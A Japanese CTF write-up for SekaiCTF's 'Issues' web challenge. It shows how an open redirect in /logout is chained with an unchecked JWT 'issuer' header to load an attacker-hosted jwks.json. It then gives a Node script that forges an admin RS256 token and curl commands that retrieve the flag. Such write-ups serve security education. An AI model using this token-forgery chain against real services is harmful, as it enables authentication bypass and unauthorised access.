# Issues:Web:356pts
Can you become an admin and get the flag?  

[http://issues-3m7gwj1d.ctf.sekai.team](http://issues-3m7gwj1d.ctf.sekai.team/)  

[issues.zip](issues.zip)  

# Solution
URLとソースが渡される。  
アクセスするとなぞのステータスコードが返ってくるサイトのようだ。  
![site.png](site/site.png)  
ソースを見ると、app.pyに以下のようにフロントが実装されている。  
```python
~~~
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def home(path):
    return "OK", 200
    return render_template("template.html", status=200, message="OK")


@app.route("/login", methods=['GET', 'POST'])
def login():
    return "Not Implemented", 501
    return render_template("template.html", status=501, message="Not Implemented"), 501


@app.route("/.well-known/jwks.json")
def jwks():
    return jwks_contents, 200, {'Content-Type': 'application/json'}


@app.route("/logout")
def logout():
    session.clear()
    redirect_uri = request.args.get('redirect', url_for('home'))
    return redirect(redirect_uri)
~~~
```
`/logout`にオープンリダイレクトがみられるが、SSTIなどは難しい。  
次にapi.pyを見ると、以下の通りであった。  
```python
~~~
api = Blueprint("api", __name__, url_prefix="/api")

valid_issuer_domain = os.getenv("HOST")
valid_algo = "RS256"


def get_public_key_url(token):
    is_valid_issuer = lambda issuer: urlparse(issuer).netloc == valid_issuer_domain

    header = jwt.get_unverified_header(token)
    if "issuer" not in header:
        raise Exception("issuer not found in JWT header")
    token_issuer = header["issuer"]

    if not is_valid_issuer(token_issuer):
        raise Exception(
            "Invalid issuer netloc: {issuer}. Should be: {valid_issuer}".format(
                issuer=urlparse(token_issuer).netloc, valid_issuer=valid_issuer_domain
            )
        )

    pubkey_url = "{host}/.well-known/jwks.json".format(host=token_issuer)
    return pubkey_url

def get_public_key(url):
    resp = requests.get(url)
    resp = resp.json()
    key = resp["keys"][0]["x5c"][0]
    return key


def has_valid_alg(token):
    header = jwt.get_unverified_header(token)
    algo = header["alg"]
    return algo == valid_algo


def authorize_request(token):
    pubkey_url = get_public_key_url(token)
    if has_valid_alg(token) is False:
        raise Exception("Invalid algorithm. Only {valid_algo} allowed.".format(valid_algo=valid_algo))

    pubkey = get_public_key(pubkey_url)
    pubkey = "-----BEGIN PUBLIC KEY-----\n{pubkey}\n-----END PUBLIC KEY-----".format(pubkey=pubkey).encode()
    decoded_token = jwt.decode(token, pubkey, algorithms=["RS256"])
    if "user" not in decoded_token:
        raise Exception("user claim missing")
    if decoded_token["user"] == "admin":
        return True

    return False


@api.before_request
def authorize():
    if "Authorization" not in request.headers:
        raise Exception("No Authorization header found")

    authz_header = request.headers["Authorization"].split(" ")
    if len(authz_header) < 2:
        raise Exception("Bearer token not found")

    token = authz_header[1]
    if not authorize_request(token):
        return "Authorization failed"


f = open("flag.txt")
secret_flag = f.read()
f.close()


@api.route("/flag")
def flag():
    return secret_flag
```
Bearerトークンで認証を行い、userがadminであった場合にフラグが表示されるようだ。  
よくある攻撃手法として外部にjwks.jsonをホスティングするものがあるが、`is_valid_issuer`でブロックされている。  
まずは`valid_issuer_domain`を確認する(署名は検証されていないので適当でよい)。  
```bash
$ echo -n '{"alg": "RS256", "issuer": "http://example.com"}' | base64
eyJhbGciOiAiUlMyNTYiLCAiaXNzdWVyIjogImh0dHA6Ly9leGFtcGxlLmNvbSJ9
$ curl http://issues-3m7gwj1d.ctf.sekai.team/api/flag -H "Authorization: Bearer eyJhbGciOiAiUlMyNTYiLCAiaXNzdWVyIjogImh0dHA6Ly9leGFtcGxlLmNvbSJ9.."
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Issues</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="container box-border flex flex-col items-center justify-center h-screen px-4 mx-auto text-center text-white bg-zinc-800">
        <h1 class="inline-block text-left w-fit text-red-300">
        <span class="my-4 text-xl font-semibold">HTTP 500</span><br>
        <span class="my-4 text-5xl font-bold">Invalid issuer netloc: example.com. Should be: localhost:8080</span>
    </h1>
</body>
</html>
```
`localhost:8080`とわかった。  
ここで、先ほどのオープンリダイレクトを活用すると任意のサイトの`/.well-known/jwks.json`を検証に使用させることができることに気づく。  
[mkjwk](https://mkjwk.org/)を用いてjwkを作成する。  
![jwk_gen.png](images/jwk_gen.png)  
作成した公開鍵を以下の通りjwks.jsonに形成し、[Beeceptor](https://beeceptor.com/)などを用い外部にホスティングする。  
今回は`https://satoki-ctf.free.beeceptor.com/.well-known/jwks.json`にホスティングした。  
```json
{
    "keys": [
        {
            "alg": "RS256",
            "x5c": [
                "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuJsMX4ixNisLwVQDYoNb\n5vjGvrCYY6WwjerYBMDaunVw2KyauROKHh94Pp2pYzEhoaWcBhg4j1wF3X5rW1B2\npMdbvljjXzVTWDeOjHH3CHBeQR72svIUkzw6XLt/4ZHaczjw7fQrtCnjIRKo7EQI\nv9yV5AL3N2nNAZvCq0Py62kD6eI/E188YskqZzbVgAMg6y8DAOQykSHfVlPrrq1K\nKgyj1XxJHrWBdM/+MEqZAXyU0ZrsgfkvJFq0E41UBhu52/MTyBFi8wfV26FY/1C9\n5enG85CqmYTQqcHASmEqiXYKMuj91Jpvkz/KWzvM0nu9b+InTF28uR0kBN15K0zC\ncwIDAQAB"
            ]
        }
    ]
}
```
次に作成した秘密鍵を用いて、userをadminに書き換えたトークンを署名する。  
オープンリダイレクトを用いて、ホスティング先の公開鍵を`issuer`に設定する。  
これらを以下のsato.jsで行う。  
```js
const fs = require("fs")
const jwt = require("jsonwebtoken")

const user = "admin";
const privatekey = fs.readFileSync("private_key.pem", "utf8");
const token = jwt.sign(
    {
        user,
    },
    privatekey,
    {
        header: {
            alg: "RS256",
            issuer: "http://localhost:8080/logout?redirect=https://satoki-ctf.free.beeceptor.com",
        }
    },
);

console.log(token);
```
実行し、出力されたトークンをcurlで`/flag`に投げてやる。  
```bash
$ node sato.js
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9zYXRva2ktY3RmLmZyZWUuYmVlY2VwdG9yLmNvbSJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2NjQ3MDQ2Mjh9.FFecXastZESyPCRnDDA8ZM_JWUzVRq_XTD1gIBgUdIg7NzjKzE0O2aZrcMkQ47O71-xgWuJP7OT34cr4Rqd4sd80EkbRCcKpFAOdA_lf8oDoK-OgByuI60DNJTlFqMTPXghAECI12oxqLSagd1pjdOTpXuPfskatq33KiRCaysFoJw4kO8XEA4fh1HqazKtrs6kQFCa4zlX2Bv09ThmJ1zmqAEm_gkFGaOEQkAsyz9Wb9iD3OWm5neltb_CzUUTVsO4zuHRog4i5GHLUKsoYDSKjDxuhuNuHBYZMV3gKu1XSq1IoJgssyL_HW9mQ9MxLETwSeE1bNsMcGxTYXvt3-Q
$ curl http://issues-3m7gwj1d.ctf.sekai.team/api/flag -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cHM6Ly9zYXRva2ktY3RmLmZyZWUuYmVlY2VwdG9yLmNvbSJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2NjQ3MDQ2Mjh9.FFecXastZESyPCRnDDA8ZM_JWUzVRq_XTD1gIBgUdIg7NzjKzE0O2aZrcMkQ47O71-xgWuJP7OT34cr4Rqd4sd80EkbRCcKpFAOdA_lf8oDoK-OgByuI60DNJTlFqMTPXghAECI12oxqLSagd1pjdOTpXuPfskatq33KiRCaysFoJw4kO8XEA4fh1HqazKtrs6kQFCa4zlX2Bv09ThmJ1zmqAEm_gkFGaOEQkAsyz9Wb9iD3OWm5neltb_CzUUTVsO4zuHRog4i5GHLUKsoYDSKjDxuhuNuHBYZMV3gKu1XSq1IoJgssyL_HW9mQ9MxLETwSeE1bNsMcGxTYXvt3-Q"
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Issues</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="container box-border flex flex-col items-center justify-center h-screen px-4 mx-auto text-center text-white bg-zinc-800">
        <h1 class="inline-block text-left w-fit">
        <span class="my-4 text-xl font-semibold">HTTP 200</span><br>
        <span class="my-4 text-5xl font-bold">SEKAI{v4l1d4t3_y0ur_i55u3r_plz}</span>
    </h1>
</body>
</html>
```
flagが得られた。  

## SEKAI{v4l1d4t3_y0ur_i55u3r_plz}